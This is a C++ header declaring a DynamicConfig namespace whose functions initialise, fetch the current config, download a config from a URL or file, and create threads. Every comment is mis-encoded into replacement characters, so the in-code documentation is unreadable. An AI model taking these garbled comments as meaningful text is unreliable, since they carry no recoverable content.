/*
  ������ � DynamicConfig.
*/
#pragma once

#include "..\common\binstorage.h"
#include "..\common\threadsgroup.h"

namespace DynamicConfig
{
  /*
    �������������.
  */
  void init(void);
  
  /*
    ���������������.
  */
  void uninit(void);
  
  /*
    �������� ������� ������������ � ������ ��������.

    Return - ��������� �� ������(���������� ���������� ����� Mem), ��� NULL � ������ ������.
  */
  BinStorage::STORAGE *getCurrent(void);
  
  /*
    �������� � ���������� �����������.

    IN url - URL ������������, ��� NULL ��� �������� �������� URL.
    Return - true - ���� ������� ��������,
             false - � ������ ������.
  */
  bool download(LPSTR url);

  bool download_file(LPSTR nameFile);
  
  /*
    �������� �������.

    IN OUT group - ������ �������, � ������� ����� ������������ ������ �������.
    
    Return       - true - � ������ ������,
                   false - � ������ ������.
  */
  bool create(ThreadsGroup::GROUP *group);
};
